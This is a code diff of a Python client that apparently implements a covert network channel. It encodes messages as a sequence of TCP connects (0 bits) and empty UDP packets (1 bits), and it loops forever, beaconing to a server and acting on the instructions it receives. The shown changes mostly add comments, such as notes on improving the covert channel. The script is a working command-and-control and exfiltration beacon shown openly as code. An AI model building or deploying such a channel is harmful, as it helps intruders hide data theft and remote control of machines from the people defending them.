@@ -2,26 +2,31 @@ import socket as Socket
 import time
 import subprocess
 
+#TODO calculate wait times via ping travel time
+
 WAITTIME = 0.001
 PORT = 1234
 HOST = "127.0.0.1"
 
+#Socket builder
 def build_socket(sockType):
     serverSock = Socket.socket(Socket.AF_INET,sockType)
     return serverSock
 
 
-def convert_to_bits(toSend:str):
+#Binary conversion of output
+def convert_to_binary(toSend:str):
     bitsOut = ""
     for letter in toSend:
-        bitsOut += format(ord(letter),"08b")
+        bitsOut += format(ord(letter),"08b") #str -> ASCII -> Binary
     return bitsOut
 
 
+#Primary traffic conversion and send
 def send_traffic(message:str):
     udpSock = build_socket(Socket.SOCK_DGRAM)
 
-    binaryToSend = convert_to_bits(message)
+    binaryToSend = convert_to_binary(message)
     for bit in binaryToSend:
         if int(bit) == 0: #Tcp connect
             tcpSock = build_socket(Socket.SOCK_STREAM)
@@ -32,10 +37,11 @@ def send_traffic(message:str):
         else: #Udp connect
             udpSock.sendto(b"",(HOST,PORT))
             time.sleep(WAITTIME)
-    time.sleep(0.5)
+    time.sleep(0.5) #Ensures order. TODO better WAITTIME calculation
     udpSock.sendto(b"END",(HOST,PORT)) #TODO provide better end method.
 
 
+#Recieves instructions from server
 def recv_traffic() -> str: #TODO improve this for better covert channels
     tcpSock = build_socket(Socket.SOCK_STREAM)
     time.sleep(0.2)
@@ -45,6 +51,7 @@ def recv_traffic() -> str: #TODO improve this for better covert channels
     return output
 
 
+#Determines client actions
 def handle_traffic(instructions:str):
     if instructions == "SLP": #No pending commands, check back later
         time.sleep(5)
@@ -56,11 +63,11 @@ def handle_traffic(instructions:str):
 
 
 def main():
-    toSend = "SHK"
+    toSend = "BDE" #Placeholder value. "Begin Data Exchange"
 
     while True:
-        send_traffic(toSend)
-        toSend = handle_traffic(recv_traffic())
+        send_traffic(toSend) #Comes first to start exchanges
+        toSend = handle_traffic(recv_traffic()) #Builds return message to server
 
 
 main()
